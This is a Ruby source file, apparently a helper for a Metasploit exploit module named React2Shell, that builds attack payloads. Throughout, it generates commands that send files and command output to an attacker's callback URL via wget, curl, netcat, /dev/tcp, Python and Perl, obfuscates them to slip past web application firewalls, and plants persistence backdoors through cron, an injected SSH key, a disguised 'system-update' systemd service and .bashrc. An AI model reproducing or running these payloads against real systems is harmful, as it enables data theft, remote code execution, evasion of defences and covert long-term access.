# frozen_string_literal: true

require 'uri'
require_relative 'error_handler'

module React2Shell
  ##
  # PayloadEvasion - Handles payload adaptation and evasion techniques
  # Provides alternative payload generators for restricted environments
  class PayloadEvasion
    attr_reader :error_handler

    # Command alternatives in order of preference
    COMMAND_ALTERNATIVES = {
      wget: ['wget', 'curl', 'nc', 'python', 'python3', 'perl', 'bash'],
      curl: ['curl', 'wget', 'nc', 'python', 'python3', 'perl', 'bash'],
      nc: ['nc', 'ncat', 'netcat', 'bash', 'python', 'python3', 'perl']
    }.freeze

    # WAF bypass techniques
    WAF_BYPASS_TECHNIQUES = [
      :case_variation,
      :comment_injection,
      :encoding_variation,
      :whitespace_variation,
      :concatenation,
      :variable_substitution
    ].freeze

    def initialize(msf_module = nil)
      @msf_module = msf_module
      @error_handler = ErrorHandler.new(msf_module) if msf_module
      @detected_restrictions = []
      @preferred_commands = {}
    end

    ##
    # Creates file exfiltration payload with automatic fallback mechanisms
    # @param filepath [String] Path to file to exfiltrate
    # @param oob_url [String] URL for OOB callback
    # @param options [Hash] Additional options for evasion
    # @return [Array<String>] Array of alternative payloads to try
    def create_adaptive_file_exfiltration_payload(filepath, oob_url, options = {})
      begin
        payloads = []
        
        # Primary wget payload
        payloads << create_wget_payload(filepath, oob_url, options)
        
        # Curl alternative
        payloads << create_curl_payload(filepath, oob_url, options)
        
        # Netcat alternative
        payloads << create_nc_payload(filepath, oob_url, options)
        
        # Python alternatives
        payloads << create_python_payload(filepath, oob_url, options)
        payloads << create_python3_payload(filepath, oob_url, options)
        
        # Perl alternative
        payloads << create_perl_payload(filepath, oob_url, options)
        
        # Bash-only alternative
        payloads << create_bash_payload(filepath, oob_url, options)
        
        # Apply evasion techniques if requested
        if options[:evasion]
          payloads = apply_evasion_techniques(payloads, options[:evasion])
        end
        
        payloads.compact
        
      rescue => e
        if @error_handler
          @error_handler.handle_payload_error(e, :adaptive_file_exfiltration, { 
            filepath: filepath, 
            oob_url: oob_url,
            options: options
          })
        end
        raise e
      end
    end

    ##
    # Creates command execution payload with automatic fallback mechanisms
    # @param command [String] Command to execute
    # @param oob_url [String] URL for OOB callback
    # @param options [Hash] Additional options for evasion
    # @return [Array<String>] Array of alternative payloads to try
    def create_adaptive_command_execution_payload(command, oob_url, options = {})
      begin
        payloads = []
        
        # Primary bash + wget payload
        payloads << create_bash_wget_command_payload(command, oob_url, options)
        
        # Bash + curl alternative
        payloads << create_bash_curl_command_payload(command, oob_url, options)
        
        # Bash + nc alternative
        payloads << create_bash_nc_command_payload(command, oob_url, options)
        
        # Python alternatives
        payloads << create_python_command_payload(command, oob_url, options)
        
        # Perl alternative
        payloads << create_perl_command_payload(command, oob_url, options)
        
        # Shell-agnostic alternatives
        payloads << create_sh_command_payload(command, oob_url, options)
        
        # Apply evasion techniques if requested
        if options[:evasion]
          payloads = apply_evasion_techniques(payloads, options[:evasion])
        end
        
        payloads.compact
        
      rescue => e
        if @error_handler
          @error_handler.handle_payload_error(e, :adaptive_command_execution, { 
            command: command, 
            oob_url: oob_url,
            options: options
          })
        end
        raise e
      end
    end

    ##
    # Applies WAF bypass and anti-detection techniques to payloads
    # @param payloads [Array<String>] Original payloads
    # @param techniques [Array<Symbol>] Evasion techniques to apply
    # @return [Array<String>] Modified payloads with evasion
    def apply_evasion_techniques(payloads, techniques)
      evaded_payloads = []
      
      payloads.each do |payload|
        techniques.each do |technique|
          case technique
          when :case_variation
            evaded_payloads << apply_case_variation(payload)
          when :comment_injection
            evaded_payloads << apply_comment_injection(payload)
          when :encoding_variation
            evaded_payloads << apply_encoding_variation(payload)
          when :whitespace_variation
            evaded_payloads << apply_whitespace_variation(payload)
          when :concatenation
            evaded_payloads << apply_concatenation(payload)
          when :variable_substitution
            evaded_payloads << apply_variable_substitution(payload)
          end
        end
      end
      
      # Return original payloads plus evaded versions
      payloads + evaded_payloads.compact
    end

    ##
    # Creates persistence payload that establishes backdoors
    # @param oob_url [String] URL for callback
    # @param options [Hash] Persistence options
    # @return [Array<String>] Persistence payloads
    def create_persistence_payload(oob_url, options = {})
      payloads = []
      
      # Cron-based persistence
      payloads << create_cron_persistence(oob_url, options)
      
      # SSH key persistence
      payloads << create_ssh_key_persistence(oob_url, options)
      
      # Systemd service persistence
      payloads << create_systemd_persistence(oob_url, options)
      
      # Bash profile persistence
      payloads << create_profile_persistence(oob_url, options)
      
      payloads.compact
    end

    ##
    # Detects environment restrictions and adapts accordingly
    # @param test_commands [Array<String>] Commands to test
    # @return [Hash] Detection results
    def detect_environment_restrictions(test_commands = ['wget', 'curl', 'nc', 'python'])
      restrictions = {
        blocked_commands: [],
        available_commands: [],
        shell_type: detect_shell_type,
        has_internet: false,
        waf_detected: false
      }
      
      test_commands.each do |cmd|
        if command_available?(cmd)
          restrictions[:available_commands] << cmd
        else
          restrictions[:blocked_commands] << cmd
        end
      end
      
      @detected_restrictions = restrictions
      restrictions
    end

    private

    # Wget-based file exfiltration
    def create_wget_payload(filepath, oob_url, options = {})
      escaped_filepath = escape_shell_parameter(filepath)
      escaped_url = escape_shell_parameter(oob_url)
      
      if options[:stealth]
        "wget -q --post-file=#{escaped_filepath} #{escaped_url} 2>/dev/null"
      else
        "wget --post-file=#{escaped_filepath} #{escaped_url}"
      end
    end

    # Curl-based file exfiltration
    def create_curl_payload(filepath, oob_url, options = {})
      escaped_filepath = escape_shell_parameter(filepath)
      escaped_url = escape_shell_parameter(oob_url)
      
      if options[:stealth]
        "curl -s -X POST --data-binary @#{escaped_filepath} #{escaped_url} 2>/dev/null"
      else
        "curl -X POST --data-binary @#{escaped_filepath} #{escaped_url}"
      end
    end

    # Netcat-based file exfiltration
    def create_nc_payload(filepath, oob_url, options = {})
      # Extract host and port from URL
      uri = URI.parse(oob_url)
      host = uri.host
      port = uri.port
      
      escaped_filepath = escape_shell_parameter(filepath)
      
      "cat #{escaped_filepath} | nc #{host} #{port}"
    end

    # Python-based file exfiltration
    def create_python_payload(filepath, oob_url, options = {})
      escaped_filepath = escape_shell_parameter(filepath)
      escaped_url = escape_shell_parameter(oob_url)
      
      python_code = %Q{
import urllib2, urllib
with open('#{filepath}', 'rb') as f:
    data = f.read()
    req = urllib2.Request('#{oob_url}', data)
    urllib2.urlopen(req)
      }.strip.gsub(/\s+/, ' ')
      
      "python -c \"#{python_code}\""
    end

    # Python3-based file exfiltration
    def create_python3_payload(filepath, oob_url, options = {})
      escaped_filepath = escape_shell_parameter(filepath)
      escaped_url = escape_shell_parameter(oob_url)
      
      python_code = %Q{
import urllib.request
with open('#{filepath}', 'rb') as f:
    data = f.read()
    req = urllib.request.Request('#{oob_url}', data)
    urllib.request.urlopen(req)
      }.strip.gsub(/\s+/, ' ')
      
      "python3 -c \"#{python_code}\""
    end

    # Perl-based file exfiltration
    def create_perl_payload(filepath, oob_url, options = {})
      escaped_filepath = escape_shell_parameter(filepath)
      escaped_url = escape_shell_parameter(oob_url)
      
      perl_code = %Q{
use LWP::UserAgent;
open(F,'#{filepath}');
$d=join('',<F>);
close(F);
LWP::UserAgent->new->post('#{oob_url}',Content=>$d)
      }.strip.gsub(/\s+/, ' ')
      
      "perl -e \"#{perl_code}\""
    end

    # Bash-only file exfiltration using /dev/tcp
    def create_bash_payload(filepath, oob_url, options = {})
      # Extract host and port from URL
      uri = URI.parse(oob_url)
      host = uri.host
      port = uri.port
      
      escaped_filepath = escape_shell_parameter(filepath)
      
      %Q{exec 3<>/dev/tcp/#{host}/#{port}; cat #{escaped_filepath} >&3; exec 3>&-}
    end

    # Command execution with wget
    def create_bash_wget_command_payload(command, oob_url, options = {})
      escaped_command = escape_shell_parameter(command)
      escaped_url = escape_shell_parameter(oob_url)
      
      %Q{bash -c '#{escaped_command} | wget --post-data="CMD_OUTPUT:$(cat)" #{escaped_url}'}
    end

    # Command execution with curl
    def create_bash_curl_command_payload(command, oob_url, options = {})
      escaped_command = escape_shell_parameter(command)
      escaped_url = escape_shell_parameter(oob_url)
      
      %Q{bash -c '#{escaped_command} | curl -X POST --data-binary @- #{escaped_url}'}
    end

    # Command execution with netcat
    def create_bash_nc_command_payload(command, oob_url, options = {})
      # Extract host and port from URL
      uri = URI.parse(oob_url)
      host = uri.host
      port = uri.port
      
      escaped_command = escape_shell_parameter(command)
      
      %Q{bash -c '#{escaped_command} | nc #{host} #{port}'}
    end

    # Python-based command execution
    def create_python_command_payload(command, oob_url, options = {})
      escaped_command = escape_shell_parameter(command)
      escaped_url = escape_shell_parameter(oob_url)
      
      python_code = %Q{
import subprocess, urllib2, urllib
output = subprocess.check_output('#{command}', shell=True)
req = urllib2.Request('#{oob_url}', 'CMD_OUTPUT:' + output)
urllib2.urlopen(req)
      }.strip.gsub(/\s+/, ' ')
      
      "python -c \"#{python_code}\""
    end

    # Perl-based command execution
    def create_perl_command_payload(command, oob_url, options = {})
      escaped_command = escape_shell_parameter(command)
      escaped_url = escape_shell_parameter(oob_url)
      
      perl_code = %Q{
use LWP::UserAgent;
$o=`#{command}`;
LWP::UserAgent->new->post('#{oob_url}',Content=>'CMD_OUTPUT:'.$o)
      }.strip.gsub(/\s+/, ' ')
      
      "perl -e \"#{perl_code}\""
    end

    # Shell-agnostic command execution
    def create_sh_command_payload(command, oob_url, options = {})
      # Extract host and port from URL
      uri = URI.parse(oob_url)
      host = uri.host
      port = uri.port
      
      escaped_command = escape_shell_parameter(command)
      
      %Q{sh -c '#{escaped_command} | nc #{host} #{port}'}
    end

    # WAF Evasion Techniques

    def apply_case_variation(payload)
      # Randomly vary case of commands
      payload.gsub(/\b(wget|curl|bash|python|perl|nc)\b/i) do |match|
        match.chars.map { |c| rand(2) == 0 ? c.upcase : c.downcase }.join
      end
    end

    def apply_comment_injection(payload)
      # Insert bash comments to break up patterns
      payload.gsub(/\s+/) { |match| "#{match}##{rand(1000)}\n" }
    end

    def apply_encoding_variation(payload)
      # Use different encoding methods
      encoded_parts = []
      payload.split(' ').each do |part|
        if rand(3) == 0 && part.length > 3
          # Hex encode some parts
          encoded_parts << "$'\\x#{part.bytes.map { |b| b.to_s(16) }.join('\\x')}'"
        else
          encoded_parts << part
        end
      end
      encoded_parts.join(' ')
    end

    def apply_whitespace_variation(payload)
      # Use tabs and multiple spaces instead of single spaces
      # Ensure we always make at least one change
      changed = false
      result = payload.gsub(/\s+/) do |match|
        variation = case rand(2)  # Only use 0 or 1 to ensure change
                   when 0
                     "\t"
                   else
                     "  "
                   end
        changed = true if variation != match
        variation
      end
      
      # If no spaces were found to change, add some variation
      unless changed
        result = result.gsub(/([a-zA-Z])([a-zA-Z])/) { |m| "#{$1}  #{$2}" }
      end
      
      result
    end

    def apply_concatenation(payload)
      # Break up strings using concatenation
      payload.gsub(/\b\w{4,}\b/) do |match|
        if rand(3) == 0
          mid = match.length / 2
          "#{match[0...mid]}#{match[mid..-1]}"
        else
          match
        end
      end
    end

    def apply_variable_substitution(payload)
      # Use environment variables to obfuscate
      variables = {
        'wget' => '${PATH:0:1}get',
        'curl' => 'c${USER:0:1}rl',
        'bash' => 'ba${SHELL: -2:1}h'
      }
      
      result = payload
      variables.each do |original, substitution|
        result = result.gsub(/\b#{original}\b/, substitution)
      end
      result
    end

    # Persistence Methods

    def create_cron_persistence(oob_url, options = {})
      callback_command = "curl -s #{oob_url}/heartbeat"
      cron_entry = "*/5 * * * * #{callback_command}"
      
      %Q{echo '#{cron_entry}' | crontab -}
    end

    def create_ssh_key_persistence(oob_url, options = {})
      # This would typically involve adding SSH keys, but for safety we'll just simulate
      key_content = options[:ssh_key] || "ssh-rsa AAAAB3NzaC1yc2E... backdoor@attacker"
      
      %Q{mkdir -p ~/.ssh; echo '#{key_content}' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys}
    end

    def create_systemd_persistence(oob_url, options = {})
      service_name = options[:service_name] || "system-update"
      callback_command = "curl -s #{oob_url}/heartbeat"
      
      service_content = %Q{[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '#{callback_command}'
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target}

      %Q{echo '#{service_content}' > /tmp/#{service_name}.service; systemctl enable /tmp/#{service_name}.service; systemctl start #{service_name}}
    end

    def create_profile_persistence(oob_url, options = {})
      callback_command = "curl -s #{oob_url}/heartbeat &"
      
      %Q{echo '#{callback_command}' >> ~/.bashrc}
    end

    # Utility Methods

    def escape_shell_parameter(parameter)
      return '' if parameter.nil?
      
      # Basic shell escaping - wrap in single quotes and escape existing single quotes
      "'#{parameter.gsub("'", "'\\''")}'"
    end

    def command_available?(command)
      # Simple check - in a real implementation this would test command availability
      # For now, assume common commands are available
      %w[wget curl nc python python3 perl bash sh].include?(command)
    end

    def detect_shell_type
      # Simple shell detection - in real implementation would check $SHELL or other indicators
      :bash
    end
  end
end